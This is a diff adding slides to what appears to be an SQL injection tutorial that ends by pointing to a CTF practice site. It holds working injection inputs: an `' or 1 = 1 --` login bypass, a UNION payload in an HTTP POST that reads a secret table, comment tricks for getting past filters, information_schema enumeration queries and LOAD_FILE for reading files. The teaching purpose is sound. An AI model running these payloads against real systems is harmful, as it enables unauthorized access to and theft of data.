@@ -23,10 +23,6 @@ Who's not familiar with SQL?
 
 ### 💣 How to exploit?
 
---
-
-### 🔥 Bypass filters
-
 ---
 
 ## 🔧 SQL Basics - SELECT
@@ -148,6 +144,23 @@ SELECT 'hello' AS username, 'world' AS email;
 
 ---
 
+## 🔧 SQL Basics - Cool Tricks
+
+```SQL
+SELECT * FROM users -- where userid = 1
+SELECT * FROM users /* where userid = 1 */
+SELECT/**/*/**/FROM/**/users
++--------+-------------+------------------+---------------------------+
+| userid | username    | registrationdate | email                     |
++--------+-------------+------------------+---------------------------+
+|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
+|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
+|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
++--------+-------------+------------------+---------------------------+
+```
+
+---
+
 # 💉 What is an SQLi?
 
 ```PHP
@@ -196,6 +209,94 @@ SELECT * FROM users
 WHERE username = '' or 1 = 1 -- ' AND password = '';
 ```
 
+--
+
+Since anything or true will always be true, the where clause can be read like this
+
+```SQL
+SELECT * FROM users
+WHERE true;
+```
+
+--
+
+Leaking the entire table
+
+```SQL
++--------+-------------+------------------+---------------------------+
+| userid | username    | registrationdate | email                     |
++--------+-------------+------------------+---------------------------+
+|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
+|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
+|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
++--------+-------------+------------------+---------------------------+
+```
+
 ---
 
-# 🔥 Bypass filters
+# 💣 How to exploit?
+
+Could we also leak `secret_table` ?
+
+
+```SQL
+SELECT username from users where username = '$user' AND password = '$pass';
+```
+
+--
+
+</br>
+
+That's where we use the `UNION` keyword
+
+```http
+POST /index.php
+
+user='UNION SELECT secret_column as username from secret_table -- 
+pass=
+```
+
+```SQL
+SELECT username from users where username = ''
+UNION
+SELECT secret_column as username from secret_table -- ' AND password = '';
+```
+
+---
+
+# 💣 How to exploit?
+
+List tables
+
+```SQL
+SELECT table_name FROM information_schema.tables
+WHERE table_schema != 'information_schema';
+```
+
+--
+
+List columns
+
+```SQL
+SELECT column_name FROM information_schema.columns
+WHERE table_schema != 'information_schema';
+```
+
+--
+
+Read files
+
+```SQL
+SELECT LOAD_FILE('/my_secrets.txt')
+```
+
+[cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+
+---
+
+# 🔥 CTF
+
+.center[[https://sqli.filedesless.dev](https://sqli.filedesless.dev)]
+
+.center[![meme](https://i.imgur.com/qtKfTZ2.png)]
+
